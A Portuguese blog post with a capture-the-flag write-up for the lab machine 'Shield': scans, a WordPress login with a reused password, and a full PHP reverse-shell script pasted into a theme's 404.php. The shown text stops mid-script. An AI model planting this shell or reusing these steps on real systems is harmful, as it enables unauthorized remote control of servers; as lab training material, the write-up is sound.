<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="HTB Shield Writeup" /><meta name="author" content="Hastur" /><meta property="og:locale" content="en" /><meta name="description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><meta property="og:description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><link rel="canonical" href="https://h41stur.github.io/posts/htb-shield-writeup/" /><meta property="og:url" content="https://h41stur.github.io/posts/htb-shield-writeup/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/htb/htb-shield-logo.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-06T22:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/htb/htb-shield-logo.png" /><meta property="twitter:title" content="HTB Shield Writeup" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Hastur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Hastur"},"dateModified":"2021-12-13T15:54:13-03:00","datePublished":"2021-09-06T22:00:00-03:00","description":"“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”","headline":"HTB Shield Writeup","image":"https://h41stur.github.io/img/htb/htb-shield-logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/htb-shield-writeup/"},"url":"https://h41stur.github.io/posts/htb-shield-writeup/"}</script><title>HTB Shield Writeup | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Shield Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB Shield Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Hastur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 6, 2021, 10:00 PM -0300" >Sep 6, 2021<i class="unloaded">2021-09-06T22:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 13, 2021, 3:54 PM -0300" >Dec 13, 2021<i class="unloaded">2021-12-13T15:54:13-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3271 words">18 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/img/htb/htb-shield-logo.png" /></p><p><br /></p><div class="table-wrapper"><table><thead><tr><th>Nome<th>Shield<tbody><tr><td>IP<td>10.10.10.29<tr><td>Pontos<td>0<tr><td>OS<td>Windows<tr><td>Nível<td>Very Easy</table></div><p><br /></p><h2 id="recon">RECON</h2><h3 id="nmap">Nmap</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.10.29 <span class="nt">--min-rate</span><span class="o">=</span>512
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device <span class="nb">type</span>: general purpose
Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2016|2012|10 <span class="o">(</span>91%<span class="o">)</span>
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 or Windows Server 2012 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2012 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows 10 1607 <span class="o">(</span>85%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Uptime guess: 0.218 days <span class="o">(</span>since Mon Sep  6 17:32:55 2021<span class="o">)</span>
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>263 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: Incremental
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><p>Desta vez sabemos que há grandes chances de estarmos lidando com o Windows Server 2016 e encontramos somente as portas 80 e 3306 abertas. Vamos começar pela porta 80.</p><h3 id="porta-80">Porta 80</h3><p><img data-proofer-ignore data-src="/img/htb/htb-shield-1.png" /></p><p>Nos deparamos com a página padrão do IIS HTTPD, o que nos dá uma boa informação. Mas precisamos de algo mais, vamos fazer uma varredura de diretórios com <code class="language-plaintext highlighter-rouge">gobuster</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> http://10.10.10.29/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-r</span>
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.29/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 10
<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Follow Redirect:         <span class="nb">true</span>
<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2021/09/06 22:51:06 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
http://10.10.10.29/wordpress            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 24088]
                                                                   
<span class="o">===============================================================</span>
2021/09/06 22:52:39 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>A varredura nos trouxe o diretório <code class="language-plaintext highlighter-rouge">/wordpress</code>, o que é uma informação muito valiosa.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-2.png" /></p><p>O Wordpress é um CMS (Content Management System) que permite a rápida criação de sites e blogs.</p><p>Por padrão, o usuário precisa se autenticar no CMS e configurar e editar todo o blog/site. Sua página de autentucação, por padrão fica em <code class="language-plaintext highlighter-rouge">wp-login.php</code>, vamos verificar se esta página está com as configurações padrão, acessando <a href="http://10.10.10.29/wordpress/wp-login.php">http://10.10.10.29/wordpress/wp-login.php</a>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-3.png" /></p><p>Neste ponto, temos várias credenciais das máquinas anteriores do <code class="language-plaintext highlighter-rouge">Starting Point</code>, tentando com algumas delas, conseguimos acesso com <code class="language-plaintext highlighter-rouge">admin:P@s5w0rd!</code>, a senha da ultima máquina <a href="https://hastur666.github.io/posts/htb-vaccine-writeup/">Vaccine</a>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-4.png" /></p><p>O Wordpress também roda em PHP, o que nos dá brecha para tentarmos um acesso remoto editando alguma página com um payload.</p><p>No menu à direita, temos as opções de edição, se clicarmos em <code class="language-plaintext highlighter-rouge">Appearance &gt; Theme Editor</code>, podemos fazer alterações nos códigos de páginas.</p><p>Se selecionarmos o tema <code class="language-plaintext highlighter-rouge">GutenBooster</code>, podemos editar o código fonte da página <code class="language-plaintext highlighter-rouge">404.php</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-shield-5.png" /></p><p>Ao editar a página, podemos inserir um payload de conexão reversa, no meu caso utilizarei o seguinte:</p><div lang="php" class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">// Copyright (c) 2020 Ivan Šincek</span>
<span class="c1">// v2.4</span>
<span class="c1">// Requires PHP v5.0.0 or greater.</span>
<span class="c1">// Works on Linux OS, macOS, and Windows OS.</span>
<span class="c1">// See the original script at https://github.com/pentestmonkey/php-reverse-shell.</span>
<span class="kd">class</span> <span class="nc">Shell</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$addr</span>  <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$port</span>  <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$os</span>    <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">),</span> <span class="c1">// shell can read from STDIN</span>
        <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">),</span> <span class="c1">// shell can write to STDOUT</span>
        <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span>  <span class="c1">// shell can write to STDERR</span>
    <span class="p">);</span>
    <span class="k">private</span> <span class="nv">$buffer</span>  <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>    <span class="c1">// read/write buffer size</span>
    <span class="k">private</span> <span class="nv">$clen</span>    <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>       <span class="c1">// command length</span>
    <span class="k">private</span> <span class="nv">$error</span>   <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>   <span class="c1">// stream read/write error</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$port</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">=</span> <span class="nv">$addr</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">port</span> <span class="o">=</span> <span class="nv">$port</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">detect</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$detected</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'LINUX'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// same for macOS</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span>    <span class="o">=</span> <span class="s1">'LINUX'</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">shell</span> <span class="o">=</span> <span class="s1">'/bin/sh'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WIN32'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="o">||</span> <span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WINNT'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="o">||</span> <span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WINDOWS'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span>    <span class="o">=</span> <span class="s1">'WINDOWS'</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">shell</span> <span class="o">=</span> <span class="s1">'cmd.exe'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$detected</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">"SYS_ERROR: Underlying operating system is not supported, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$detected</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">daemonize</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$exit</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"DAEMONIZE: pcntl_fork() does not exists, moving on...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$pid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pcntl_fork</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Cannot fork off the parent process, moving on...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$exit</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Child process forked off successfully, parent process will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// once daemonized you will actually no longer see the script's dump</span>
            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Completed successfully!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">settings</span><span class="p">()</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// do not impose the script execution time limit</span>
        <span class="o">@</span><span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// set the file/directory permissions - 666 for files and 777 for directories</span>
    <span class="p">}</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">,</span> <span class="s1">'&amp;lt;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'&amp;gt;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">read</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">))</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// suppress an error when reading from a closed blocking stream</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">error</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>                            <span class="c1">// set global error flag</span>
            <span class="k">echo</span> <span class="s2">"STRM_ERROR: Cannot read from </span><span class="si">{</span><span class="nv">$name</span><span class="si">}</span><span class="s2">, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$data</span><span class="p">))</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// suppress an error when writing to a closed blocking stream</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">error</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>                            <span class="c1">// set global error flag</span>
            <span class="k">echo</span> <span class="s2">"STRM_ERROR: Cannot write to </span><span class="si">{</span><span class="nv">$name</span><span class="si">}</span><span class="s2">, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$bytes</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// read/write method for non-blocking streams</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">rw</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">((</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">write</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">,</span> <span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'WINDOWS'</span> <span class="o">&amp;&amp;</span> <span class="nv">$oname</span> <span class="o">===</span> <span class="s1">'STDIN'</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">+=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// calculate the command length</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">// script's dump</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)</span>
    <span class="c1">// we must read the exact byte length from a stream and not a single byte more</span>
    <span class="k">private</span> <span class="k">function</span> <span class="n">brw</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$fstat</span> <span class="o">=</span> <span class="nb">fstat</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
        <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$fstat</span><span class="p">[</span><span class="s1">'size'</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'WINDOWS'</span> <span class="o">&amp;&amp;</span> <span class="nv">$iname</span> <span class="o">===</span> <span class="s1">'STDOUT'</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// for some reason Windows OS pipes STDIN into STDOUT</span>
            <span class="c1">// we do not like that</span>
            <span class="c1">// we need to discard the data from the stream</span>
            <span class="k">while</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">&gt;=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">-=</span> <span class="nv">$bytes</span><span class="p">;</span>
                <span class="nv">$size</span> <span class="o">-=</span> <span class="nv">$bytes</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">&gt;=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">:</span> <span class="nv">$size</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">write</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">,</span> <span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
